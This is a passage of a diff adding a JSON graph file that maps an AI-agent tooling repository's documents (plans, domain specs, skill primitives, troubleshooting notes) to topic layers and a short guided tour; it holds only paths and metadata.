+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:RULES",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:llm_backends_template",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:llm_backends_template_wingman",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:task",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:test_proposal",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:test_write",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:tiny_plan",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:tiny_plan_response",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:.cursor/plans/f5_vision_starting_gates_95820a49.plan",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:.cursor/plans/provider-profiles-split_f809ec49.plan",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:.cursor/plans/tool-calls-integr_42508a5d.plan",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:plans/archive/README",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:plans/archive/proximo-trabajo-P4-P8",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:plans/archive/referencia-delegate-panes-mailbox",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:plans/archivos-retirados",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:plans/fuera-de-alcance",
+      "target": "topic:roadmaps-&-planning",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/DomainSpec-v2-Specification",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/DomainSpec",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/classify",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/git.domain",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/open-questions",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/plan",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:DomainSpec/thoughts",
+      "target": "topic:domain-specifications",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/delegate-router/SKILL",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/delegation-gate/SKILL",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/nomic-local/SKILL",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/paid-bash-security-v1-1/SKILL",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/paid-bash-security-v1-1/skill-card",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/append",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/bash",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/grep",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/help",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/http",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/ls",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/mkdir",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/pwsh",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/python",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/read",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/primitives/write",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/pulse-routing/SKILL",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/README",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/agents/architecture",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/agents/base",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/agents/dependency",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/agents/documentation",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/agents/refactor",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/repo-hygiene/templates/issue",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/troubleshooting/disk_full",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/troubleshooting/module_not_found",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/troubleshooting/permission_denied",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:skills/_meta/troubleshooting/port_in_use",
+      "target": "topic:skills-meta",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:core/README",
+      "target": "topic:other-documentation",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:docs/operator",
+      "target": "topic:other-documentation",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:docs/planning_template",
+      "target": "topic:other-documentation",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    }
+  ],
+  "layers": [
+    {
+      "id": "layer:core-guidelines-&-identity",
+      "name": "Core Guidelines & Identity",
+      "description": "Core Guidelines & Identity (12 nodes)",
+      "nodeIds": [
+        "article:GUIA_LEGAL_USUARIO",
+        "article:IDENTITY_IDEAS",
+        "article:core/README",
+        "article:RULES",
+        "article:llm_backends_template",
+        "article:llm_backends_template_wingman",
+        "article:task",
+        "article:test_proposal",
+        "article:test_write",
+        "article:tiny_plan",
+        "article:tiny_plan_response",
+        "topic:core-guidelines-&-identity"
+      ]
+    },
+    {
+      "id": "layer:roadmaps-&-planning",
+      "name": "Roadmaps & Planning",
+      "description": "Roadmaps & Planning (9 nodes)",
+      "nodeIds": [
+        "article:.cursor/plans/f5_vision_starting_gates_95820a49.plan",
+        "article:.cursor/plans/provider-profiles-split_f809ec49.plan",
+        "article:.cursor/plans/tool-calls-integr_42508a5d.plan",
+        "article:plans/archive/README",
+        "article:plans/archive/proximo-trabajo-P4-P8",
+        "article:plans/archive/referencia-delegate-panes-mailbox",
+        "article:plans/archivos-retirados",
+        "article:plans/fuera-de-alcance",
+        "topic:roadmaps-&-planning"
+      ]
+    },
+    {
+      "id": "layer:domain-specifications",
+      "name": "Domain Specifications",
+      "description": "Domain Specifications (8 nodes)",
+      "nodeIds": [
+        "article:DomainSpec/DomainSpec-v2-Specification",
+        "article:DomainSpec/DomainSpec",
+        "article:DomainSpec/classify",
+        "article:DomainSpec/git.domain",
+        "article:DomainSpec/open-questions",
+        "article:DomainSpec/plan",
+        "article:DomainSpec/thoughts",
+        "topic:domain-specifications"
+      ]
+    },
+    {
+      "id": "layer:skills-meta",
+      "name": "Skills Meta",
+      "description": "Skills Meta (29 nodes)",
+      "nodeIds": [
+        "article:skills/_meta/delegate-router/SKILL",
+        "article:skills/_meta/delegation-gate/SKILL",
+        "article:skills/_meta/nomic-local/SKILL",
+        "article:skills/_meta/paid-bash-security-v1-1/SKILL",
+        "article:skills/_meta/paid-bash-security-v1-1/skill-card",
+        "article:skills/_meta/primitives/append",
+        "article:skills/_meta/primitives/bash",
+        "article:skills/_meta/primitives/grep",
+        "article:skills/_meta/primitives/help",
+        "article:skills/_meta/primitives/http",
+        "article:skills/_meta/primitives/ls",
+        "article:skills/_meta/primitives/mkdir",
+        "article:skills/_meta/primitives/pwsh",
+        "article:skills/_meta/primitives/python",
+        "article:skills/_meta/primitives/read",
+        "article:skills/_meta/primitives/write",
+        "article:skills/_meta/pulse-routing/SKILL",
+        "article:skills/_meta/repo-hygiene/README",
+        "article:skills/_meta/repo-hygiene/agents/architecture",
+        "article:skills/_meta/repo-hygiene/agents/base",
+        "article:skills/_meta/repo-hygiene/agents/dependency",
+        "article:skills/_meta/repo-hygiene/agents/documentation",
+        "article:skills/_meta/repo-hygiene/agents/refactor",
+        "article:skills/_meta/repo-hygiene/templates/issue",
+        "article:skills/_meta/troubleshooting/disk_full",
+        "article:skills/_meta/troubleshooting/module_not_found",
+        "article:skills/_meta/troubleshooting/permission_denied",
+        "article:skills/_meta/troubleshooting/port_in_use",
+        "topic:skills-meta"
+      ]
+    },
+    {
+      "id": "layer:other-documentation",
+      "name": "Other Documentation",
+      "description": "Other Documentation (4 nodes)",
+      "nodeIds": [
+        "article:core/README",
+        "article:docs/operator",
+        "article:docs/planning_template",
+        "topic:other-documentation"
+      ]
+    },
+    {
+      "id": "layer:other",
+      "name": "Other",
+      "description": "Uncategorized nodes (1)",
+      "nodeIds": [
+        "article:README"
+      ]
+    }
+  ],
+  "tour": [
+    {
+      "order": 1,
+      "title": "Core Guidelines & Identity",
+      "description": "Explore the Core Guidelines & Identity section (11 articles)",
+      "nodeIds": [
+        "article:GUIA_LEGAL_USUARIO",
+        "article:IDENTITY_IDEAS",
+        "article:core/README"
+      ]
+    },
+    {
+      "order": 2,
+      "title": "Roadmaps & Planning",
+      "description": "Explore the Roadmaps & Planning section (8 articles)",
+      "nodeIds": [
+        "article:.cursor/plans/f5_vision_starting_gates_95820a49.plan",
+        "article:.cursor/plans/provider-profiles-split_f809ec49.plan",
+        "article:.cursor/plans/tool-calls-integr_42508a5d.plan"
+      ]
+    },
+    {
+      "order": 3,
+      "title": "Domain Specifications",
+      "description": "Explore the Domain Specifications section (7 articles)",
+      "nodeIds": [
+        "article:DomainSpec/DomainSpec-v2-Specification",
+        "article:DomainSpec/DomainSpec",
+        "article:DomainSpec/classify"
+      ]
+    },
+    {
+      "order": 4,
+      "title": "Skills Meta",
+      "description": "Explore the Skills Meta section (28 articles)",
+      "nodeIds": [
+        "article:skills/_meta/delegate-router/SKILL",
+        "article:skills/_meta/delegation-gate/SKILL",
+        "article:skills/_meta/nomic-local/SKILL"
+      ]
+    },
+    {
+      "order": 5,
+      "title": "Other Documentation",
+      "description": "Explore the Other Documentation section (3 articles)",
+      "nodeIds": [
+        "article:core/README",
+        "article:docs/operator",
+        "article:docs/planning_template"
+      ]
+    }
+  ]
+}
